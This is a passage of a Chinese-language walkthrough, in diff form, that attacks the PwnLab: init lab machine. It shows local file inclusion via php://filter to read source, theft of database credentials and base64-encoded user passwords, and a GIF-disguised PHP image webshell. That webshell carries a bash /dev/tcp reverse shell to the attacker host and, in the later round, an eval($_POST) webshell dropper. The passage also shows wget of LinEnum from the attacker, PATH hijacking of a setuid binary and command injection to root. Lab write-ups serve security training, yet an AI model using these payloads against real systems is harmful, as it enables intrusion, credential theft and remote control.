class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>接下来就是将反弹shell脚本加上GIF文件头，来混过getimagesize函数检测， 然后另存为.gif图片混过白名单以及mime类型检测，上传成功。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF98a<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.100.129/10086 0&gt;&amp;1&#x27;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201920.png" srcset="/img/loading.gif" lazyload alt="image-20251211170130603"></p>
+<p>先监听10086端口</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201544.png" srcset="/img/loading.gif" lazyload alt="image-20251211165523838"></p>
+<p>图片马传上去了之后，要想办法取解析这个图片马，能想到的是解析漏 洞，在或者文件包含，但是在之前的文件包含的位置不能进行执行。去读取首页源码。得到突破点。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.130</span><span class="hljs-regexp">/?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=index<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201609.png" srcset="/img/loading.gif" lazyload alt="image-20251211165608533"></p>
+<p>因为在page这个参数上面自动给你添加.php文件后缀名。这也是为什么之前 在利用文件包含时不加文件后缀的原因。在读取首页文件的源码，找到其他可利用的文件包含的位置和字段lang且位置在cookie字段里面。</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-comment">//Multilingual. Not implemented yet.</span></span><br><span class="language-php"><span class="hljs-comment">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span></span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lang&#x27;</span>]))</span><br><span class="language-php">&#123;</span><br><span class="language-php">	<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;lang/&quot;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lang&#x27;</span>]);</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-comment">// Not implemented yet.</span></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PwnLab Intranet Image Hosting<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;images/pwnlab.png&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml">[ <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> ] [ <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;?page=login&quot;</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> ] [ <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;?page=upload&quot;</span>&gt;</span>Upload<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> ]</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">	<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]))</span><br><span class="language-php">	&#123;</span><br><span class="language-php">		<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>].<span class="hljs-string">&quot;.php&quot;</span>);</span><br><span class="language-php">	&#125;</span><br><span class="language-php">	<span class="hljs-keyword">else</span></span><br><span class="language-php">	&#123;</span><br><span class="language-php">		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Use this server to upload and share image files inside the intranet&quot;</span>;</span><br><span class="language-php">	&#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>截获upload页面的点击数据包。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201292.png" srcset="/img/loading.gif" lazyload alt="image-20251211170226693"></p>
+<p>获取到了shell会话。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201873.png" srcset="/img/loading.gif" lazyload alt="image-20251211170247795"></p>
+<p>还是id一下，不出意外,低等级权限，开始提权。shell看着难受，我们改一下shell。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201180.png" srcset="/img/loading.gif" lazyload alt="image-20251211170338013"></p>
+<p>切换用户。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">su</span> kane<br>iSv5Ym2GRo<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202127.png" srcset="/img/loading.gif" lazyload alt="image-20251211170422068"></p>
+<p>起一个python服务器。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python2</span> -m SimpleHTTPServer<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201299.png" srcset="/img/loading.gif" lazyload alt="image-20251211170732251"></p>
+<p>靶机拉取提权检测脚本。</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">wget http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.100.129:8000/LinEnum.sh</span><br></code></pre></td></tr></table></figure>
+
+<p>提示没权限。找个有权限的目录。</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">find</span> / -<span class="hljs-keyword">type</span> d \( -perm -002 -o -perm -020 \) -ls<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201518.png" srcset="/img/loading.gif" lazyload alt="image-20251211170612720"></p>
+<p>切换目录在下载，给文件权限执行shell提权脚本。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/tmp</span><br>wget http:<span class="hljs-string">//192.168.100.129</span><span class="hljs-function">:8000</span>/LinEnum.sh<br>chmod 777 LinEnum.sh<br><span class="hljs-string">./LinEnum.sh</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201559.png" srcset="/img/loading.gif" lazyload alt="image-20251211170835720"></p>
+<p>一片红，没找到提权线索。</p>
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201260.png" srcset="/img/loading.gif" lazyload alt="image-20251211170915752" style="zoom:50%;" />
+
+<p>据我判断就是有什么可执行文件可以进行提权。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202949.png" srcset="/img/loading.gif" lazyload alt="image-20251211171033301"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./msgmike<br></code></pre></td></tr></table></figure>
+
+<p>执行之后告诉我们没有这个文件或者目录，重点是用户目录变了，是 mike。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201936.png" srcset="/img/loading.gif" lazyload alt="image-20251211171136194"></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">string</span>s msgmike<br></code></pre></td></tr></table></figure>
+
+<p>string命令扎到一行跟报错相关的问题。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202951.png" srcset="/img/loading.gif" lazyload alt="image-20251211171230279"></p>
+<p>报错提示该程序在没有完整路径的情况下调用cat</p>
+<p>利用cat命令去查看 &#x2F;home&#x2F;mike&#x2F;msg.txt,但是当前路径时kane的家目录是没有这个文件的</p>
+<p>利用环境变量来提权。</p>
+<p>查看我们当前的环境变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201320.png" srcset="/img/loading.gif" lazyload alt="image-20251211171338177"></p>
+<p>在当前目录建立一个cat文件，将环境变量修改为当前家目录，</p>
+<p>并将其覆盖掉原来的环境变量，这样路径就完整了。文件也就能执行了.重 点在于我们的用户变了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">chmod</span> 777 <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">export</span> PATH=/home/kane<br>./msgmike<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201941.png" srcset="/img/loading.gif" lazyload alt="image-20251211171558519"></p>
+<p>切换了用户后首先先把环境变量在恢复。不然原来的命令就出现了问题</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">export <span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin:/usr</span><span class="hljs-regexp">/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span><br>echo $<span class="hljs-variable constant_">PATH</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201655.png" srcset="/img/loading.gif" lazyload alt="image-20251211171639033"></p>
+<p>mike的用户里面也有一个文件，分析一下这个文件</p>
+<p>发现输入记录到&#x2F;root目录中的文本文件中。用户输入传递给&#x2F;bin&#x2F;echo命令， 并最终附加到root&#x2F;messages.txt文件。回显输入后，使用命令注入来执行 Shell。Bash无法正常工作， 换成&#x2F;bin&#x2F;sh，获得了root shell。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201079.png" srcset="/img/loading.gif" lazyload alt="image-20251211172117005"></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201202.png" srcset="/img/loading.gif" lazyload alt="image-20251211172130773"></p>
+<h1 id="第二轮"><a href="#第二轮" class="headerlink" title="第二轮"></a>第二轮</h1><p>首先不知道靶机的IP，要进行一下目标探测</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.230.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201252.png" srcset="/img/loading.gif" lazyload alt="image-20251211201245176"></p>
+<p>这时候已经知道了目标的IP了。</p>
+<p>信息收集，对它进行端口扫描，敏感目录、敏感文件扫描。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.230.130</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201696.png" srcset="/img/loading.gif" lazyload alt="image-20251211201530089"></p>
+<p>发现对方开放80web端口、3306mysql端口和RPC服务</p>
+<p>先去80端口搞一波，看一下主页有三个选项：主页，登录和上传。</p>
+<p>直接去上传功能的位置发现想上传必须要登陆，不是未授权访问的页面。 要登陆就需要账号密码，所以暂时搁置等其他线索。注意的一点是，在登陆以及上传的位置可能存在文件包含。就看这个参数有没有过滤，客户端 对这个可不可控。但是就算可能存在文件包含但是也有一个问题。在于有什么文件可以进行包含。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152203483.png" srcset="/img/loading.gif" lazyload alt="image-20251211201345228"></p>
+<p>扫一扫路径下都有什么文件。找到有upload文件夹以及upload.php文件还有 config.php和index.php。</p>
+<p>这些文件：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152203016.png" srcset="/img/loading.gif" lazyload alt="image-20251211201438490"></p>
+<p>现在再去判断一下是否存在我们刚才猜测的文件包含的问题。文件包含有很多协议。用其中的filter协议去看能否读出文件源码。（这里演示一下存在的带有后缀和不带后缀的问题）观察原本的结构也是不带有文件后缀的。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">230.130</span><span class="hljs-regexp">/?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64encode/resource=config.php （错误）<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">230.130</span><span class="hljs-regexp">/?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=config （正确）<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201895.png" srcset="/img/loading.gif" lazyload alt="image-20251211163659983"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$server</span>	  = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;H4u%QJ_H99&quot;</span>;<br><span class="hljs-variable">$database</span> = <span class="hljs-string">&quot;Users&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>得出重要信息。得到了数据库的账号以及密码。同时结合刚刚在扫描端口 哪里发现了对方是开发3306mysql端口的所以。我们的突破点来了。去连接对方的数据库在里面有什么内容。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201257.png" srcset="/img/loading.gif" lazyload alt="image-20251211202124494"></p>
+<p>突破点来了，有三组账号，且对方的前端是存在登录页面的。而且是可以传文件的。</p>
+<p>三组账号是加密的但是可以很清楚的判定为base64加密，解密得到明文。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kent | <span class="hljs-attribute">Sld6WHVCSkpOeQ</span>==<br>mike | <span class="hljs-attribute">U0lmZHNURW42SQ</span>==<br>kane | <span class="hljs-attribute">aVN2NVltMkdSbw</span>==<br>Kent: JWzXuBJJNy<br>Mike: SIfdsTEn6I<br>Kane: iSv5Ym2GRo<br></code></pre></td></tr></table></figure>
+
+<p>可以上传文件了，因为现在有账号密码了。不出意外，不是任意文件上传。这个时候可以白盒也可以黑盒。因为有文件包含漏洞。可以去包含 upload.php去看源码有什么限制。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">230.130</span><span class="hljs-regexp">/?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=upload<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201683.png" srcset="/img/loading.gif" lazyload alt="image-20251211164216939"></p>
+<p>允许.jpg”,”.jpeg”,”.gif”,”.png。检查文件头以及白名单后缀名以及mime类 型，上传后将文件名字重新命名。</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">session_start</span>();</span><br><span class="language-php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])) &#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You must be log in.&#x27;</span>); &#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">		<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&#x27;post&#x27;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&#x27;multipart/form-data&#x27;</span>&gt;</span></span><br><span class="language-xml">			<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;file&#x27;</span> /&gt;</span></span><br><span class="language-xml">			<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;submit&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;submit&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;Upload&#x27;</span>/&gt;</span></span><br><span class="language-xml">		<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="language-php">	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] &lt;= <span class="hljs-number">0</span>) &#123;</span><br><span class="language-php">		<span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];</span><br><span class="language-php">		<span class="hljs-variable">$filetype</span>  = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];</span><br><span class="language-php">		<span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&#x27;upload/&#x27;</span>;</span><br><span class="language-php">		<span class="hljs-variable">$file_ext</span>  = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>);</span><br><span class="language-php">		<span class="hljs-variable">$imageinfo</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="language-php">		<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.jpg&quot;</span>,<span class="hljs-string">&quot;.jpeg&quot;</span>,<span class="hljs-string">&quot;.gif&quot;</span>,<span class="hljs-string">&quot;.png&quot;</span>); </span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span> (!(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$whitelist</span>))) &#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Not allowed extension, please upload images only.&#x27;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filetype</span>,<span class="hljs-string">&#x27;image&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Error 001&#x27;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$imageinfo</span>[<span class="hljs-string">&#x27;mime&#x27;</span>] != <span class="hljs-string">&#x27;image/gif&#x27;</span> &amp;&amp; <span class="hljs-variable">$imageinfo</span>[<span class="hljs-string">&#x27;mime&#x27;</span>] != <span class="hljs-string">&#x27;image/jpeg&#x27;</span> &amp;&amp; <span class="hljs-variable">$imageinfo</span>[<span class="hljs-string">&#x27;mime&#x27;</span>] != <span class="hljs-string">&#x27;image/jpg&#x27;</span>&amp;&amp; <span class="hljs-variable">$imageinfo</span>[<span class="hljs-string">&#x27;mime&#x27;</span>] != <span class="hljs-string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Error 002&#x27;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$filetype</span>, <span class="hljs-string">&#x27;/&#x27;</span>)&gt;<span class="hljs-number">1</span>)&#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Error 003&#x27;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-variable">$uploadfile</span> = <span class="hljs-variable">$uploaddir</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])).<span class="hljs-variable">$file_ext</span>;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploadfile</span>)) &#123;</span><br><span class="language-php">			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-variable">$uploadfile</span>.<span class="hljs-string">&quot;\&quot;&gt;&lt;br /&gt;&quot;</span>;</span><br><span class="language-php">		&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Error 4&#x27;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php">	&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>接下来就是将反弹shell脚本加上GIF文件头，来混过getimagesize函数检测， 然后另存为.gif图片混过白名单以及mime类型检测，上传成功。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF98a<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201582.png" srcset="/img/loading.gif" lazyload alt="image-20251211203426370"></p>
